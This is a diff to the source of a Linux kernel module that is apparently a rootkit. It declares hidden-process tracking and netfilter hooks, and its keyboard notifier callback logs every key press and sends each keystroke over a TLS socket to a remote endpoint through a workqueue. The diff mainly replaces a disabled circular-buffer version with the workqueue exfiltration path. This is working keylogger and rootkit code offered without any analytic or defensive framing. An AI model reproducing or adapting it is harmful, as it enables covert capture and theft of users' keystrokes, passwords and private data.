@@ -13,7 +13,6 @@
 #include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/net.h>
-#include <linux/workqueue.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/pid_namespace.h>
@@ -26,6 +25,7 @@
 #include <linux/types.h>
 #include <linux/udp.h>
 #include <linux/un.h>
+#include <linux/workqueue.h>
 #include <net/sock.h>
 
 #include "shared.h"
@@ -66,17 +66,10 @@ static struct task_pid hidden_procs[10];
 int hidden_count = 0;
 static rwlock_t* my_tasklist_lock;
 
-static const char* key_circ_buf[64];
-static size_t key_head = 0;
-static size_t key_tail = 0;
-
-static DEFINE_SPINLOCK(prod_lock);
-static DEFINE_SPINLOCK(cons_lock);
-
-void consume_keys(struct work_struct *work);
+void consume_keys(struct work_struct* work);
 
 struct my_work {
-    const char *keylog_data;
+    const char* keylog_data;
     struct work_struct ws;
 } key_work;
 
@@ -531,9 +524,6 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
     struct keyboard_notifier_param* param = _param;
     const char* keycode = NULL;
-    unsigned long head;
-    unsigned long tail;
-    unsigned long flags;
 
     /* Trace only when a key is pressed down */
     if (!(param->down)) {
@@ -552,84 +542,23 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
     }
 
     //Can't just write directly inside an interrupt context, so use a circular buffer to pass to a different thread
-
     printk(KERN_INFO "Keycode: %s\n", keycode);
 
-#if 0
-    //spin_lock_irqsave(&prod_lock, flags);
-
-    head = key_head;
-    // The spin_unlock() and next spin_lock() provide needed ordering.
-    tail = READ_ONCE(key_tail);
-
-    if (CIRC_SPACE(head, tail, 64) >= 1) {
-        // insert one item into the buffer
-        key_circ_buf[head] = keycode;
-
-        smp_store_release(&key_head, (head + 1) & (64 - 1));
-
-        printk(KERN_INFO "Wrote to buffer %d %d\n", head, tail);
-
-        // wake_up() will make sure that the head is committed before waking anyone up
-        //wake_up(consumer);
-    } else {
-        printk(KERN_INFO "Buffer is full\n");
-    }
-    //spin_unlock_irqrestore(&prod_lock, flags);
-#else
     key_work.keylog_data = keycode;
     INIT_WORK(&key_work.ws, &consume_keys);
     schedule_work(&key_work.ws);
-#endif
 
     return NOTIFY_OK;
 }
 
-#if 0
-int consume_keys(void) {
-    unsigned long head;
-    unsigned long tail;
-    const char *item;
-    unsigned long flags;
-
-    while (!kthread_should_stop()) {
-        printk(KERN_INFO "Pre read loop\n");
-        //spin_lock_irqsave(&cons_lock, flags);
-        // Read index before reading contents at that index.
-        head = smp_load_acquire(&key_head);
-        tail = key_tail;
-        printk(KERN_INFO "Post read loop\n");
-
-        if (CIRC_CNT(head, tail, 64) >= 1) {
-            // extract one item from the buffer
-            item = key_circ_buf[tail];
-
-            send_msg(svc->tls_socket, (unsigned char *) item, strlen(item));
-            printk(KERN_INFO "Sent keystroke %d %d %d\n", head, tail, strlen(item));
-
-            // Finish reading descriptor before incrementing tail.
-            smp_store_release(&key_tail, (tail + 1) & (64 - 1));
-        } else {
-            printk(KERN_INFO "Nothing to send %d %d %d\n", CIRC_CNT(head, tail, 64), head, tail);
-        }
-        //spin_unlock_irqrestore(&cons_lock, flags);
-    }
-    printk(KERN_INFO "Outside loop\n");
-    return 0;
-}
-#else
-void consume_keys(struct work_struct *work) {
-    const char *keystroke = key_work.keylog_data;
+void consume_keys(struct work_struct* work) {
+    const char* keystroke = key_work.keylog_data;
     if (!keystroke) {
         return;
     }
-    int r = send_msg(svc->tls_socket, (unsigned char*) keystroke, strlen(keystroke));
-    if (r < 0) {
-        printk(KERN_INFO "Send failed with error code %d\n", r);
-    }
-    printk(KERN_INFO "Sent keystroke %s %d\n", keystroke, r);
+    send_msg(svc->tls_socket, (unsigned char*) keystroke, strlen(keystroke));
+    printk(KERN_INFO "Sent keystroke %s\n", keystroke);
 }
-#endif
 
 /*
  * function:
